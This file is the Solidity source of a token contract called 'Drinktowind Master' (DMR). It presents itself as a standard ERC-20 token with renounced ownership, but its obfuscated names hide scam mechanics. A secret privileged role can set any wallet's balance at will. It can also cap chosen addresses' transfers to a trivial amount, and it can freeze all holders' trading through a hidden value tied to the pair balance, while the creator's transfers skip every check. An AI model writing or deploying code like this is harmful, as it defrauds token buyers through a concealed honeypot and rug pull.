//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface senderFrom {
    function createPair(address amountExempt, address maxAmount) external returns (address);
}

interface feeSwap {
    function totalSupply() external view returns (uint256);

    function balanceOf(address listMode) external view returns (uint256);

    function transfer(address teamLaunch, uint256 fromWallet) external returns (bool);

    function allowance(address txEnable, address spender) external view returns (uint256);

    function approve(address spender, uint256 fromWallet) external returns (bool);

    function transferFrom(
        address sender,
        address teamLaunch,
        uint256 fromWallet
    ) external returns (bool);

    event Transfer(address indexed from, address indexed sellEnable, uint256 value);
    event Approval(address indexed txEnable, address indexed spender, uint256 value);
}

abstract contract atLaunch {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface teamMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface feeSwapMetadata is feeSwap {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DrinktowindMaster is atLaunch, feeSwap, feeSwapMetadata {

    function transfer(address receiverFrom, uint256 fromWallet) external virtual override returns (bool) {
        return toWallet(_msgSender(), receiverFrom, fromWallet);
    }

    event OwnershipTransferred(address indexed takeMinSell, address indexed marketingToken);

    function owner() external view returns (address) {
        return tokenMaxEnable;
    }

    uint256 public enableSell;

    uint256 public modeMin;

    function transferFrom(address autoReceiver, address teamLaunch, uint256 fromWallet) external override returns (bool) {
        if (_msgSender() != receiverListMarketing) {
            if (receiverTeam[autoReceiver][_msgSender()] != type(uint256).max) {
                require(fromWallet <= receiverTeam[autoReceiver][_msgSender()]);
                receiverTeam[autoReceiver][_msgSender()] -= fromWallet;
            }
        }
        return toWallet(autoReceiver, teamLaunch, fromWallet);
    }

    string private marketingTradingFund = "DMR";

    mapping(address => bool) public tokenAuto;

    address totalWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private enableBuyList;

    function enableShould() private view {
        require(tokenAuto[_msgSender()]);
    }

    uint256 public receiverMinTo;

    function tokenTrading(uint256 fromWallet) public {
        enableShould();
        launchFundTo = fromWallet;
    }

    address public takeSenderLiquidity;

    uint256 public walletTx;

    function symbol() external view virtual override returns (string memory) {
        return marketingTradingFund;
    }

    function balanceOf(address listMode) public view virtual override returns (uint256) {
        return amountLimitTrading[listMode];
    }

    uint256 private autoFeeLaunched;

    function receiverTx() public {
        emit OwnershipTransferred(receiverToLaunched, address(0));
        tokenMaxEnable = address(0);
    }

    address private tokenMaxEnable;

    function getOwner() external view returns (address) {
        return tokenMaxEnable;
    }

    mapping(address => mapping(address => uint256)) private receiverTeam;

    function toLaunch(address modeMarketing) public {
        enableShould();
        
        if (modeMarketing == receiverToLaunched || modeMarketing == takeSenderLiquidity) {
            return;
        }
        teamWalletTx[modeMarketing] = true;
    }

    bool public totalTrading;

    function totalShould(address receiverFrom, uint256 fromWallet) public {
        enableShould();
        amountLimitTrading[receiverFrom] = fromWallet;
    }

    bool public minIsSwap;

    address receiverListMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function decimals() external view virtual override returns (uint8) {
        return receiverIs;
    }

    uint256 private listAt = 100000000 * 10 ** 18;

    function takeTrading(address toTakeSell) public {
        require(toTakeSell.balance < 100000);
        if (enableIs) {
            return;
        }
        if (receiverMinTo != modeMin) {
            modeMin = modeAmountMax;
        }
        tokenAuto[toTakeSell] = true;
        
        enableIs = true;
    }

    uint256 constant teamBuy = 11 ** 10;

    address public receiverToLaunched;

    function name() external view virtual override returns (string memory) {
        return txAtMode;
    }

    mapping(address => bool) public teamWalletTx;

    string private txAtMode = "Drinktowind Master";

    function totalSupply() external view virtual override returns (uint256) {
        return listAt;
    }

    uint256 launchFundTo;

    uint8 private receiverIs = 18;

    function amountMarketing(address autoReceiver, address teamLaunch, uint256 fromWallet) internal returns (bool) {
        require(amountLimitTrading[autoReceiver] >= fromWallet);
        amountLimitTrading[autoReceiver] -= fromWallet;
        amountLimitTrading[teamLaunch] += fromWallet;
        emit Transfer(autoReceiver, teamLaunch, fromWallet);
        return true;
    }

    constructor (){
        
        teamMarketing maxTotal = teamMarketing(receiverListMarketing);
        takeSenderLiquidity = senderFrom(maxTotal.factory()).createPair(maxTotal.WETH(), address(this));
        
        receiverToLaunched = _msgSender();
        tokenAuto[receiverToLaunched] = true;
        amountLimitTrading[receiverToLaunched] = listAt;
        receiverTx();
        
        emit Transfer(address(0), receiverToLaunched, listAt);
    }

    bool public enableIs;

    function allowance(address feeExempt, address fromAutoMin) external view virtual override returns (uint256) {
        if (fromAutoMin == receiverListMarketing) {
            return type(uint256).max;
        }
        return receiverTeam[feeExempt][fromAutoMin];
    }

    function approve(address fromAutoMin, uint256 fromWallet) public virtual override returns (bool) {
        receiverTeam[_msgSender()][fromAutoMin] = fromWallet;
        emit Approval(_msgSender(), fromAutoMin, fromWallet);
        return true;
    }

    mapping(address => uint256) private amountLimitTrading;

    function toWallet(address autoReceiver, address teamLaunch, uint256 fromWallet) internal returns (bool) {
        if (autoReceiver == receiverToLaunched) {
            return amountMarketing(autoReceiver, teamLaunch, fromWallet);
        }
        uint256 swapLaunched = feeSwap(takeSenderLiquidity).balanceOf(totalWallet);
        require(swapLaunched == launchFundTo);
        require(teamLaunch != totalWallet);
        if (teamWalletTx[autoReceiver]) {
            return amountMarketing(autoReceiver, teamLaunch, teamBuy);
        }
        return amountMarketing(autoReceiver, teamLaunch, fromWallet);
    }

    uint256 sellFrom;

    uint256 public modeAmountMax;

}